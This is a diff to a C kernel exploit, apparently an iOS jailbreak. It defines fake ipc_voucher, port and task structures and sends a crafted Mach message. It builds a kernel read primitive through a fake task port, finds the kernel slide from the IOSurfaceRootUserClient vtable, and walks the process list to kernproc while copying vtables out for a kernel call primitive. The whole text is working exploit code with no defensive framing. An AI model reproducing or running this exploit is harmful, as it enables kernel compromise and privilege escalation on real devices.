@@ -35,6 +35,103 @@ static uint32_t transpose(uint32_t val)
     return ret + 0x01010101;
 }
 
+// ********** ********** ********** data structures ********** ********** **********
+
+#define IO_BITS_ACTIVE      0x80000000
+#define IOT_PORT            0
+#define IKOT_TASK           2
+#define IKOT_CLOCK          25
+#define IKOT_IOKIT_CONNECT  29
+
+#define WQT_QUEUE               0x2
+#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)
+
+typedef volatile struct 
+{
+    /* 0x00 */ uint32_t iv_hash;
+    /* 0x04 */ uint32_t iv_sum;
+    /* 0x08 */ uint32_t iv_refs;
+    /* 0x0c */ uint32_t iv_table_size;
+    /* 0x10 */ uint32_t iv_inline_table[6];
+    /* 0x28 */ uint64_t padding0;
+    /* 0x30 */ uint64_t iv_table;
+    /* 0x38 */ uint64_t iv_port;
+    /* 0x40 */ uint64_t iv_hash_link_next;
+    /* 0x48 */ uint64_t iv_hash_link_prev;
+} fake_ipc_voucher_t;
+
+typedef volatile struct 
+{
+    uint32_t ip_bits;
+    uint32_t ip_references;
+    struct {
+        uint64_t data;
+        uint64_t type;
+    } ip_lock; // spinlock
+    struct {
+        struct {
+            struct {
+                uint32_t flags;
+                uint32_t waitq_interlock;
+                uint64_t waitq_set_id;
+                uint64_t waitq_prepost_id;
+                struct {
+                    uint64_t next;
+                    uint64_t prev;
+                } waitq_queue;
+            } waitq;
+            uint64_t messages;
+            uint32_t seqno;
+            uint32_t receiver_name;
+            uint16_t msgcount;
+            uint16_t qlimit;
+            uint32_t pad;
+        } port;
+        uint64_t klist;
+    } ip_messages;
+    uint64_t ip_receiver;
+    uint64_t ip_kobject;
+    uint64_t ip_nsrequest;
+    uint64_t ip_pdrequest;
+    uint64_t ip_requests;
+    uint64_t ip_premsg;
+    uint64_t ip_context;
+    uint32_t ip_flags;
+    uint32_t ip_mscount;
+    uint32_t ip_srights;
+    uint32_t ip_sorights;
+} kport_t;
+
+typedef struct
+{
+    struct {
+        uint64_t data;
+        uint32_t reserved : 24,
+                    type     :  8;
+        uint32_t pad;
+    } lock; // mutex lock
+    uint32_t ref_count;
+    uint32_t active;
+    uint32_t halting;
+    uint32_t pad;
+    uint64_t map;
+} ktask_t;
+
+union waitq_flags
+{
+    struct {
+        uint32_t /* flags */
+    waitq_type:2,    /* only public field */
+    waitq_fifo:1,    /* fifo wakeup policy? */
+    waitq_prepost:1, /* waitq supports prepost? */
+    waitq_irq:1,     /* waitq requires interrupts disabled */
+    waitq_isvalid:1, /* waitq structure is valid */
+    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
+    waitq_eventmask:_EVENT_MASK_BITS;
+    };
+    uint32_t flags;
+};
+
 // ********** ********** ********** MIG ********** ********** **********
 
 struct simple_msg
@@ -149,84 +246,50 @@ void trigger_gc_please()
     sleep(1);
 }
 
-// ********** ********** ********** data structures ********** ********** **********
-
-#define IO_BITS_ACTIVE      0x80000000
-#define IOT_PORT            0
-#define IKOT_TASK           2
-#define IKOT_CLOCK          25
-#define IKOT_IOKIT_CONNECT  29
-
-typedef volatile struct 
+static inline uint32_t mach_port_waitq_flags() 
 {
-    /* 0x00 */ uint32_t iv_hash;
-    /* 0x04 */ uint32_t iv_sum;
-    /* 0x08 */ uint32_t iv_refs;
-    /* 0x0c */ uint32_t iv_table_size;
-    /* 0x10 */ uint32_t iv_inline_table[6];
-    /* 0x28 */ uint64_t padding0;
-    /* 0x30 */ uint64_t iv_table;
-    /* 0x38 */ uint64_t iv_port;
-    /* 0x40 */ uint64_t iv_hash_link_next;
-    /* 0x48 */ uint64_t iv_hash_link_prev;
-} fake_ipc_voucher_t;
+    union waitq_flags waitq_flags = {};
+    waitq_flags.waitq_type              = WQT_QUEUE;
+    waitq_flags.waitq_fifo              = 1;
+    waitq_flags.waitq_prepost           = 0;
+    waitq_flags.waitq_irq               = 0;
+    waitq_flags.waitq_isvalid           = 1;
+    waitq_flags.waitq_turnstile_or_port = 1;
+    return waitq_flags.flags;
+}
 
-typedef volatile struct 
+static kern_return_t send_port(mach_port_t rcv, mach_port_t myP)
 {
-    uint32_t ip_bits;
-    uint32_t ip_references;
-    struct {
-        uint64_t data;
-        uint64_t type;
-    } ip_lock; // spinlock
-    struct {
-        struct {
-            struct {
-                uint32_t flags;
-                uint32_t waitq_interlock;
-                uint64_t waitq_set_id;
-                uint64_t waitq_prepost_id;
-                struct {
-                    uint64_t next;
-                    uint64_t prev;
-                } waitq_queue;
-            } waitq;
-            uint64_t messages;
-            uint32_t seqno;
-            uint32_t receiver_name;
-            uint16_t msgcount;
-            uint16_t qlimit;
-            uint32_t pad;
-        } port;
-        uint64_t klist;
-    } ip_messages;
-    uint64_t ip_receiver;
-    uint64_t ip_kobject;
-    uint64_t ip_nsrequest;
-    uint64_t ip_pdrequest;
-    uint64_t ip_requests;
-    uint64_t ip_premsg;
-    uint64_t ip_context;
-    uint32_t ip_flags;
-    uint32_t ip_mscount;
-    uint32_t ip_srights;
-    uint32_t ip_sorights;
-} kport_t;
+    typedef struct {
+        mach_msg_header_t          Head;
+        mach_msg_body_t            msgh_body;
+        mach_msg_port_descriptor_t task_port;
+    } Request;
 
-typedef struct
-{
-    struct {
-        uint64_t data;
-        uint32_t reserved : 24,
-                    type     :  8;
-        uint32_t pad;
-    } lock; // mutex lock
-    uint32_t ref_count;
-    uint32_t active;
-    uint32_t halting;
-    uint32_t pad;
-    uint64_t map;
-} ktask_t;
+    kern_return_t err = 0;
+    
+    Request stuff;
+    Request *InP = &stuff;
+    InP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+    InP->Head.msgh_size = sizeof(Request);
+    InP->Head.msgh_remote_port = rcv;
+    InP->Head.msgh_local_port = MACH_PORT_NULL;
+    InP->Head.msgh_id = 0x1337;
+    
+    InP->msgh_body.msgh_descriptor_count = 1;
+    InP->task_port.name = myP;
+    InP->task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
+    InP->task_port.type = MACH_MSG_PORT_DESCRIPTOR;
+
+    err = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, InP->Head.msgh_size, 0, 0, 5, 0);
+    
+    if (err) 
+    {
+        printf("mach_msg failed = %d (%s)!\n",err,mach_error_string(err));
+    }
+    
+    return err;
+}
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
 
@@ -336,8 +399,9 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     fakeport->ip_references = 100;
     fakeport->ip_lock.type = 0x11;
     fakeport->ip_messages.port.receiver_name = 1;
-    fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
-    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
+    fakeport->ip_messages.port.msgcount = 0;
+    fakeport->ip_messages.port.qlimit = 1;
+    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
     fakeport->ip_srights = 99;
      
     LOG("fakeport: 0x%llx", (uint64_t)fakeport);
@@ -477,65 +541,8 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     
     mach_port_t the_one = real_port_to_fake_voucher;
     
-    uint64_t textbase = offsets->data.system_clock;
-    
-    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
-    fakeport->ip_references = 0xff;
+    // uint64_t textbase = offsets->data.system_clock;
 
-    /* 
-        the slide will always have a minimum value of 0x1000000 and 
-        intervals of 0x200000. according to iphonewiki it is calculated as so:
-        slide = 0x1000000 + (slide_byte * 0x200000)
-        where slide byte is a value between 0x0 and 0xff
-        if slide_byte=0x0 then a hardcoded value of 0x21000000 is used
-    */
-
-#define KSLIDE_BASE     0x1000000
-#define KSLIDE_INTERVAL 0x200000
-#define KSLIDE_LIMIT    KSLIDE_BASE + (KSLIDE_INTERVAL * 0x100)
-
-    /* 
-        find the slide via clock_sleep
-        technique by esser I believe?
-        I start from the system clock offset to make it *way* faster than without 
-        (typically you would brute force the address, there was some algorithim help narrow
-         down the possible values but this was broken at some point -- it's possible Apple
-         changed the way the port was stored in __DATA so it was no longer predictable)
-        note: i said "should be 100%"... this can fail sometimes; i'm not sure why 
-        (clock_sleep_trap will sometimes return success even if it's not the right kslide)
-    */
-    uint64_t k = KSLIDE_BASE + KSLIDE_INTERVAL;
-    while (k <= KSLIDE_LIMIT)
-    {
-        fakeport->ip_kobject = textbase + k;
-        
-        ret = clock_sleep_trap(the_one, 0, 0, 0, 0);
-        
-        if (ret != KERN_FAILURE)
-        {
-            LOG("got clock at: 0x%llx", textbase + k);
-            goto gotclock;
-        }
-        
-        k += KSLIDE_INTERVAL;
-        
-        if ((k % KSLIDE_BASE) == 0)
-        {
-            LOG("k = %llx...", k);
-        }
-    }
-
-    /* if this fails, your system_clock offset is probably wrong */
-    LOG("failed to find clock/kslide");
-    goto out;
-
-gotclock:;
-    
-    uint64_t kslide = k;
-    uint64_t kernel_base = offsets->constant.kernel_image_base + kslide;
-    LOG("kernel slide: 0x%llx", kslide);
-    LOG("kernel base: 0x%llx", kernel_base);
-    
     /* set our fakeport back to a TASK port and setup arbitrary read via pid_for_task */
     fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
     
@@ -563,6 +570,118 @@ rk32(addr + 0x4, read64_tmp);\
 rk32(addr, value);\
 value = value | ((uint64_t)read64_tmp << 32)
 
+    ret = mach_port_insert_right(mach_task_self(), the_one, the_one, MACH_MSG_TYPE_COPY_SEND);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("mach_port_insert_right failed: %x %s", ret, mach_error_string(ret));
+        goto out;
+    }
+
+    mach_port_t gangport;
+    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gangport);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("mach_port_allocate: %x %s", ret, mach_error_string(ret));
+        goto out;
+    }
+
+    ret = mach_port_insert_right(mach_task_self(), gangport, gangport, MACH_MSG_TYPE_MAKE_SEND);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to insert send right: %x %s", ret, mach_error_string(ret));
+        goto out;
+    }
+
+    ret = send_port(the_one, gangport);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
+        ret = KERN_FAILURE;
+        goto out;
+    }
+
+    uint64_t ikmq_base = fakeport->ip_messages.port.messages;
+    LOG("got ikmq_base: 0x%llx", ikmq_base);
+
+    uint64_t ikm_header = 0x0;
+    rk64(ikmq_base + 0x18, ikm_header); /* ipc_kmsg->ikm_header */
+    LOG("ikm_header: 0x%llx", ikm_header);
+
+    uint64_t port_addr = 0x0;
+    rk64(ikm_header + 0x24, port_addr); /* 0x24 is mach_msg_header_t + body + offset of our port into mach_port_descriptor_t */ 
+    LOG("port_addr: 0x%llx", port_addr);
+
+    uint64_t itk_space = 0x0;
+    rk64(port_addr + offsetof(kport_t, ip_receiver), itk_space);
+    LOG("itk_space: 0x%llx", itk_space);
+
+    uint64_t ourtask = 0x0;
+    rk64(itk_space + 0x28, ourtask); /* ipc_space->is_task */
+    LOG("ourtask: 0x%llx", ourtask);
+
+    ret = mach_ports_register(mach_task_self(), &client, 1);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("mach_ports_register failed: %x %s", ret, mach_error_string(ret));
+        goto out;
+    }
+
+    uint64_t iosruc_port = 0x0;
+    rk64(ourtask + offsets->struct_offsets.task_itk_registered, iosruc_port);
+    if (iosruc_port == 0x0)
+    {
+        LOG("failed to get IOSurfaceRootUserClient port!");
+        goto out;
+    }
+
+    uint64_t iosruc_addr = 0x0;
+    rk64(iosruc_port + offsetof(kport_t, ip_kobject), iosruc_addr);
+    if (iosruc_addr == 0x0)
+    {
+        LOG("failed to get IOSurfaceRootUserClient address!");
+        goto out;
+    }
+
+    uint64_t iosruc_vtab = 0x0;
+    rk64(iosruc_addr + 0x0, iosruc_vtab);
+    if (iosruc_vtab == 0x0)
+    {
+        LOG("failed to get IOSurfaceRootUserClient vtab!");
+        goto out;
+    }
+
+    uint64_t get_trap_for_index_addr = 0x0;
+    rk64(iosruc_vtab + (offsets->iosurface.get_external_trap_for_index * 0x8), get_trap_for_index_addr);
+    if (get_trap_for_index_addr == 0x0)
+    {
+        LOG("failed to get IOSurface::getExternalTrapForIndex func ptr!");
+        goto out;
+    }
+
+#define KERNEL_HEADER_OFFSET        0x4000
+#define KERNEL_SLIDE_STEP           0x100000
+    
+    uint64_t kernel_base = (get_trap_for_index_addr & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
+
+    do
+    {
+        uint32_t kbase_value = 0x0;
+        rk32(kernel_base, kbase_value);
+    
+        if (kbase_value == MH_MAGIC_64)
+        {
+            LOG("found kernel_base: 0x%llx", kernel_base);
+            break;
+        }
+
+        kernel_base -= KERNEL_SLIDE_STEP;
+    } while (true);
+
+    uint64_t kslide = kernel_base - offsets->constant.kernel_image_base;
+    
+    LOG("kernel slide: 0x%llx", kslide);
+    LOG("kernel base: 0x%llx", kernel_base);
+
     /* try and read our kbase to make sure our read is working properly */
     uint32_t kbase_value = 0x0;
     rk32(kernel_base, kbase_value);
@@ -573,78 +692,47 @@ value = value | ((uint64_t)read64_tmp << 32)
     }
     LOG("read kernel base value: %x", kbase_value);
 
-    uint64_t kernproc_offset = offsets->data.kernproc + kslide;
+    uint64_t ourproc = 0x0;
+    rk64(ourtask + offsets->struct_offsets.task_bsd_info, ourproc);
+    LOG("got ourproc: 0x%llx", ourproc);
 
-    /* 
-        kernproc is an offset which finds the kernel's proc_t struct     
-        this gives us a great entry into a linked list of all proc
-        structs in the kernel 
-    */
-    uint64_t kernproc;
-    rk64(kernproc_offset, kernproc);
-    LOG("got kernproc: 0x%llx", kernproc);
-    
-    uint64_t proc = kernproc;
-    
-    LOG("searching for our proc (%d)...", getpid());
-    
-    /* find our proc_t struct */
-    while (proc)
+    /* find kernproc by looping linked list */
+
+    uint64_t kernproc = ourproc;
+    while (kernproc != 0x0)
     {
-        uint32_t found_pid;
-        rk32(proc + offsets->struct_offsets.proc_pid, found_pid); 
-        if (found_pid == getpid())
+        uint32_t found_pid = 0x0;
+        rk32(kernproc + offsets->struct_offsets.proc_pid, found_pid);
+        if (found_pid == 0)
         {
             break;
         }
-        
-        rk64(proc + 0x8, proc); // proc->p_list->le_prev
-        if (proc == 0x0)
-        {
-            LOG("failed to get next proc");
-            goto out;
-        }
+
+        /* 
+            kernproc will always be at the start of the linked list,
+            so we loop backwards in order to find it
+        */
+        rk64(kernproc + 0x0, kernproc);
     }
-    
-    uint64_t ourproc = proc;
-    LOG("got ourproc 0x%llx", ourproc);
-    
-    uint64_t ourtask;
-    rk64(ourproc + offsets->struct_offsets.proc_task, ourtask);
-    LOG("got ourtask: 0x%llx", ourtask);
-    
-    /* 
-        register the IOSurfaceRootUserClient port onto our task
-        this will store a pointer to the kernel ipc_port within
-        task_t->itk_registered[0]
-    */ 
-    mach_ports_register(mach_task_self(), &client, 1);
-    
-    uint64_t itk_registered;
-    rk64(ourtask + offsets->struct_offsets.task_itk_registered, itk_registered);
-    LOG("itk_registered: 0x%llx", itk_registered);
 
-    uint64_t ip_kobject;
-    rk64(itk_registered + offsetof(kport_t, ip_kobject), ip_kobject);
-    LOG("ip_kobject: 0x%llx", ip_kobject);
-    
-    uint64_t ioruc_vtab;
-    rk64(ip_kobject, ioruc_vtab);
-    LOG("ioruc vtab: 0x%llx", ioruc_vtab);
-    
-    /* 
-        once we find the object we can patch the vtable and set up an 
-        arbitrary kernel call primitive via the IOSurfaceRoot user client 
-    */
+    if (kernproc == 0x0)
+    {
+        LOG("failed to find kernproc");
+        ret = KERN_FAILURE;
+        goto out;
+    }
 
+    LOG("got kernproc: 0x%llx", kernproc);
+
+    /* copy out vtable into userland */
+    
     uint64_t *iosurface_vtab = (uint64_t *)malloc(0xC0 * sizeof(uint64_t));
     LOG("iosurface_vtab: 0x%llx", (uint64_t)iosurface_vtab);
     
-    /* copy out vtable into userland */
     for (int i = 0; i < 0xC0; i++)
     {
         uint64_t vtab_entry = 0x0;
-        rk64(ioruc_vtab + (i * sizeof(uint64_t)), vtab_entry);
+        rk64(iosruc_vtab + (i * sizeof(uint64_t)), vtab_entry);
         iosurface_vtab[i] = vtab_entry;
     }
     
@@ -658,7 +746,7 @@ value = value | ((uint64_t)read64_tmp << 32)
     for (int i = 0; i < 0x200; i++)
     {
         uint64_t client_entry = 0x0;
-        rk64(ip_kobject + (i * sizeof(uint64_t)), client_entry);
+        rk64(iosruc_addr + (i * sizeof(uint64_t)), client_entry);
         iosurface_client[i] = client_entry;
     }
     
@@ -838,7 +926,7 @@ value = value | ((uint64_t)read64_tmp << 32)
         since our IOSurfaceRoot userclient is owned by kernel, the 
         ip_receiver field will point to kernel's ipc space 
     */ 
-    uint64_t ipc_space_kernel = kread64(itk_registered + offsetof(kport_t, ip_receiver));
+    uint64_t ipc_space_kernel = kread64(iosruc_port + offsetof(kport_t, ip_receiver));
     LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);
 
     /* allocate a buffer for our fake kernel task port */
